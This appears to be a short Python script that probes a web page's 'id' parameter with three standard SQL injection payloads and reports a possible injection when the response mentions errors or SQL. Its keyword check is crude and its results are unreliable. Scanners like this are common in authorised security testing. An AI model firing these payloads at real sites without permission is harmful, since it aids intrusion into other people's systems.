import requests

def check_sql_injection(url):
    payloads = ["' OR 1=1 --", '" OR "a"="a', "' UNION SELECT null, null --"]
    for payload in payloads:
        response = requests.get(url, params={'id': payload})
        if "error" in response.text or "SQL" in response.text:
            print(f"Potential SQL Injection found at: {url}")
        else:
            print(f"No SQL Injection found at: {url}")

check_sql_injection('http://example.com/product?id=1')
